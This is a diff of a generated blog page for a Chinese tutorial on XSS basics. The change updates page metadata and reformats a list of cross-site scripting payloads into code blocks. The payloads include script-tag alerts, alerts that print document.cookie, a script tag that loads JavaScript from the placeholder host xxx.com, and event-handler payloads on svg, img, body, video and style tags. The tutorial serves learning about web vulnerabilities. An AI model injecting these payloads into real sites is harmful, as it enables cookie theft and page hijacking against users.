@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png">
 <meta property="article:published_time" content="2023-12-01T12:22:37.000Z">
-<meta property="article:modified_time" content="2023-12-04T12:47:15.442Z">
+<meta property="article:modified_time" content="2023-12-05T01:05:21.524Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="基础漏洞学习">
 <meta name="twitter:card" content="summary_large_image">
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k words
+          3.9k words
         
       </span>
     
@@ -242,7 +242,7 @@
         
         
         
-          10 mins
+          33 mins
         
       </span>
     
@@ -302,34 +302,35 @@
 <blockquote>
 <p>document.referer   用于记录跳转过来的url<br>window.name         用于记录设置窗口的值，用于页面之间传送时数据，特别是在使用 iframe 或弹出窗口，可以在不同页面之间传递信息或状态<br>location                 是一个对象，代表了当前窗口的url信息。还包含了主机，路径，查询参数等信息<br>innerHTML<br>documen.write       是一个方法，用于动态的向文档中插入内容</p>
 </blockquote>
-<h1 id="XSS攻击的payload"><a href="#XSS攻击的payload" class="headerlink" title="XSS攻击的payload"></a>XSS攻击的payload</h1><h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><blockquote>
-<script>alert("hack")</script>   #弹出hack
-<script>alert(/hack/)</script>   #弹出hack
-<script>alert(1)</script>        #弹出1，对于数字可以不用引号
-<script>alert(document.cookie)</script>      #弹出cookie
-<script src=http://xxx.com/xss.js></script>  #引用外部的xss
-</blockquote>
-<h2 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h2><p>这个标签可以理解为优化的图片的标签</p>
-<blockquote>
-<!-- <svg onload="alert(1)">
+<h1 id="XSS攻击的payload"><a href="#XSS攻击的payload" class="headerlink" title="XSS攻击的payload"></a>XSS攻击的payload</h1><h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>
 
-<!-- <svg onload="alert(1)"// 
-</blockquote>
+
+
+
+
+<h2 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h2><p>这个标签可以理解为优化的图片的标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;// </span><br></code></pre></td></tr></table></figure>
+
+
+
 <h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">onerror  这个是错误处理，可以理解为当程序有问题的时候会触发这个，然后执行里的函数<br>事件在加载外部文件（文档或图像）发生错误时触发。<br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(“hack”)&gt;<br>&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(document.cookie)&gt;  #弹出cookie</p>
-</blockquote>
-<h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><blockquote>
-<body οnlοad=alert(1)>
-<body οnpageshοw=alert(1)>
-</blockquote>
-<h2 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h2><blockquote>
-<p>&lt;video οnlοadstart&#x3D;alert(1) src&#x3D;”&#x2F;media&#x2F;hack-the-planet.mp4” &#x2F;&gt;</p>
-</blockquote>
-<h2 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h2><blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
-</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">hack</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>  #弹出cookie<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
 <h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul>
 <li>用户输入作为<strong>script</strong>标签内容</li>
 <li>用户输入作为HTML<strong>注释内容</strong></li>
